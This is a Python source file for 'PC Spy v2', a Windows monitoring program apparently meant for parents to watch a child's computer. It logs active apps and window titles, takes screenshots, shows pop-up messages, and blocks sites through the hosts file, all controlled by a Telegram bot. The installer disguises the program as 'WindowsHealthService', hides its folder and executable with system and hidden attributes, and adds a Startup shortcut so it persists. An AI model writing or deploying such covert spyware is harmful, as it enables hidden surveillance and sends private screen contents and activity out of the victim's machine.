
import os
import sys
import shutil
import time
import requests
import configparser
import threading
import psutil
import win32gui
import win32process
import subprocess
import tkinter as tk
from tkinter import simpledialog, messagebox
import ctypes
from datetime import datetime
from peewee import *
from PIL import ImageGrab
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# --- CONFIG ---
CHECK_INTERVAL_SEC = 5

# --- SYSTEM DETECTION ---
def get_app_dir():
    return os.path.join(os.environ.get('APPDATA', '.'), 'WindowsHealth')

APP_DIR = get_app_dir()
CFG_PATH = os.path.join(APP_DIR, 'config.ini')

if getattr(sys, 'frozen', False):
    EXE_PATH = sys.executable
else:
    EXE_PATH = os.path.abspath(__file__)

# --- DB MODEL ---
db_file = os.path.join(APP_DIR, 'sys_metrics.db')
db = SqliteDatabase(None)

class ActivityLog(Model):
    timestamp = DateTimeField(default=datetime.now)
    process = CharField()
    category = CharField()
    duration = IntegerField(default=0)
    class Meta: database = db

def init_db():
    if not os.path.exists(APP_DIR): os.makedirs(APP_DIR, exist_ok=True)
    db.init(db_file)
    db.connect()
    db.create_tables([ActivityLog])

# --- UTILS ---
def get_active_app():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        proc = psutil.Process(pid)
        return proc.name().lower(), win32gui.GetWindowText(hwnd)
    except: return "idling", ""

STUDY_KW = ["гдз", "решебник", "дневник", "класс", "учебник", "school", "math", "physics", "python", "vscode"]
GAME_PROCS = ["minecraft", "csgo", "valorant", "dota", "steam", "discord", "roblox", "tanki", "warthunder", "fortnite", "robocraft", "worldoftanks"]
VIDEO_KW = ["youtube", "twitch", "rutube", "kinopoisk", "netflix", "okko"]

def categorize(app, title):
    a, t = app.lower(), title.lower()
    for g in GAME_PROCS: 
        if g in a or g in t: return "Game", g.capitalize()
    for s in STUDY_KW: 
        if s in t: return "Study", "Study: " + t[:25]
    for v in VIDEO_KW: 
        if v in t: return "Video", "Video: " + t[:25]
    return "Other", app

# --- MESSAGING ---
def send_telegram(msg, chat_id, token):
    if not chat_id or not token: return
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})
    except: pass

# --- MONITOR ---
def monitor_thread(chat_id, token):
    init_db()
    
    current_cat = None
    current_app = None
    start_time = time.time()
    last_alert_time = 0
    
    while True:
        try:
            raw_app, raw_title = get_active_app()
            cat, app_name = categorize(raw_app, raw_title)
            
            # --- STATE CHANGE LOGIC ---
            is_new_activity = False
            
            if cat != current_cat:
                is_new_activity = True
            elif cat == "Game" and app_name != current_app:
                is_new_activity = True
            
            if is_new_activity:
                now = time.time()
                duration = int(now - start_time)
                
                # Log Finished Session
                if current_cat and duration > 60:
                    mins = duration // 60
                    try: ActivityLog.create(process=current_app, category=current_cat, duration=duration)
                    except: pass
                    
                    if current_cat in ["Game", "Video"]:
                        send_telegram(f"🛑 **Finished {current_cat}**: {current_app}\nDuration: {mins} mins", chat_id, token)
                
                # Log Started Session
                if cat in ["Game", "Video"]:
                     send_telegram(f"▶️ **Started {cat}**: {app_name}", chat_id, token)

                current_cat = cat
                current_app = app_name
                start_time = now
                last_alert_time = now
            
            # --- PERIODIC ALERTS ---
            duration = time.time() - start_time
            if cat in ["Game", "Video"] and duration > 30*60: # > 30 mins
                if time.time() - last_alert_time >= 30*60: # Alert every 30 mins
                    mins = int(duration // 60)
                    send_telegram(f"⚠️ **Alert**: Still {cat} ({app_name}) for **{mins} mins**!", chat_id, token)
                    last_alert_time = time.time()
            
            time.sleep(CHECK_INTERVAL_SEC)

        except Exception as e:
            time.sleep(CHECK_INTERVAL_SEC)

# --- BOT HANDLERS ---
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    last = ActivityLog.select().order_by(ActivityLog.timestamp.desc()).first()
    if last:
        await update.message.reply_text(f"Last Log: **{last.category}** ({last.process})\nAt: {last.timestamp.strftime('%H:%M')}")
    else:
        await update.message.reply_text("Monitoring active. No logs yet.")

async def report(update: Update, context: ContextTypes.DEFAULT_TYPE):
    today = datetime.now().date()
    stats = (ActivityLog
             .select(ActivityLog.category, fn.SUM(ActivityLog.duration).alias('total'))
             .where(fn.date(ActivityLog.timestamp) == today)
             .group_by(ActivityLog.category))
    
    msg = f"📊 **Report for {today}**\n"
    total = 0
    for stat in stats:
        h, m = divmod(stat.total, 3600)
        m //= 60
        msg += f"- **{stat.category}**: {h}h {m}m\n"
        total += stat.total
    
    if total == 0: msg += "No significant activity."
    else:
        th, tm = divmod(total, 3600)
        tm //= 60
        msg += f"\nTotal: {th}h {tm}m"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def send_msg_to_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /msg Text")
        return
    text = " ".join(context.args)
    
    def show():
        ctypes.windll.user32.MessageBoxW(0, text, "Сообщение от Родителей", 0x40000 | 0x1) # TOPMOST | OK
    
    threading.Thread(target=show).start()
    await update.message.reply_text(f"Message sent: '{text}'")

async def send_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await update.message.reply_text("📸 Делаю скриншот...")
    try:
        ss = ImageGrab.grab()
        temp_path = os.path.join(APP_DIR, "screen.png")
        ss.save(temp_path)
        
        with open(temp_path, 'rb') as photo:
            await update.message.reply_photo(photo=photo, caption=f"Снимок: {datetime.now().strftime('%H:%M:%S')}")
            
        os.remove(temp_path)
        await status_msg.delete()
    except Exception as e:
        await status_msg.edit_text(f"Ошибка скриншота: {e}")

HOSTS_PATH = r"C:\Windows\System32\drivers\etc\hosts"

def modify_hosts(domain, block=True):
    try:
        with open(HOSTS_PATH, 'r') as f: lines = f.readlines()
        
        new_lines = []
        domain_clean = domain.replace("https://", "").replace("http://", "").split("/")[0]
        
        for line in lines:
            if domain_clean in line and "127.0.0.1" in line: continue
            new_lines.append(line)
            
        if block:
            if new_lines[-1].strip() != "": new_lines.append("\n")
            new_lines.append(f"127.0.0.1 {domain_clean}\n")
            new_lines.append(f"127.0.0.1 www.{domain_clean}\n")
            
        with open(HOSTS_PATH, 'w') as f: f.writelines(new_lines)
        subprocess.run("ipconfig /flushdns", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True, "Done"
    except PermissionError:
        return False, "Нужен запуск от Администратора!"
    except Exception as e:
        return False, str(e)

async def block_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Пример: /block youtube.com")
        return
    domain = context.args[0]
    ok, msg = modify_hosts(domain, True)
    await update.message.reply_text(f"Блок {domain}: {msg}")

async def unblock_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Пример: /unblock youtube.com")
        return
    domain = context.args[0]
    ok, msg = modify_hosts(domain, False)
    await update.message.reply_text(f"Разблок {domain}: {msg}")

# --- INSTALLER ---
def install_me():
    root = tk.Tk()
    root.withdraw()
    
    # 1. Ask Token
    bot_token = simpledialog.askstring("System Setup", "Шаг 1/2\nВведите токен бота (от BotFather):")
    if not bot_token: sys.exit(0)
    
    # 2. Ask ID
    user_id = simpledialog.askstring("System Setup", "Шаг 2/2\nВведите ваш Telegram ID (от @userinfobot):")
    if not user_id: sys.exit(0)
    
    try:
        if not os.path.exists(APP_DIR): os.makedirs(APP_DIR)
        
        config = configparser.ConfigParser()
        config['Settings'] = {'ParentID': user_id, 'BotToken': bot_token}
        with open(CFG_PATH, 'w') as f: config.write(f)
        
        dest_exe = os.path.join(APP_DIR, "WindowsHealthService.exe")
        shutil.copy2(EXE_PATH, dest_exe)
        
        # Hide files (System + Hidden)
        subprocess.run(f'attrib +s +h "{APP_DIR}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(f'attrib +s +h "{dest_exe}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Shortcut (Run as Admin if possible, but usually just Startup)
        cmd = f'$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinHealth.lnk"); $SC.TargetPath = "{dest_exe}"; $SC.Save()'
        subprocess.run(["powershell", "-Command", cmd], creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.Popen([dest_exe])
        messagebox.showinfo("Success", "Установлено! Папка скрыта.")
        sys.exit(0)
    except Exception as e:
        messagebox.showerror("Error", str(e))
        sys.exit(1)

# --- MAIN ENTRY ---
if __name__ == '__main__':
    bot_token = None
    chat_id = None
    
    is_frozen = getattr(sys, 'frozen', False)
    
    if is_frozen:
        my_dir = os.path.dirname(EXE_PATH)
        cfg_here = os.path.join(my_dir, 'config.ini')
        if os.path.exists(cfg_here):
            config = configparser.ConfigParser()
            config.read(cfg_here)
            if 'Settings' in config:
                chat_id = config['Settings'].get('ParentID')
                bot_token = config['Settings'].get('BotToken')
        else:
            install_me()
    else:
        # Dev fallback
        pass

    if bot_token and chat_id:
        t = threading.Thread(target=monitor_thread, args=(chat_id, bot_token), daemon=True)
        t.start()
        
        send_telegram("✅ **PC Spy v2 Online**\nCommands: /screen, /block, /unblock, /msg", chat_id, bot_token)
            
        try:
            app = Application.builder().token(bot_token).build()
            app.add_handler(CommandHandler("status", status))
            app.add_handler(CommandHandler("report", report))
            app.add_handler(CommandHandler("msg", send_msg_to_pc))
            app.add_handler(CommandHandler("screen", send_screen))
            app.add_handler(CommandHandler("block", block_site))
            app.add_handler(CommandHandler("unblock", unblock_site))
            app.run_polling()
        except Exception:
            while True: time.sleep(60)
    else:
        if is_frozen and not bot_token:
             install_me()
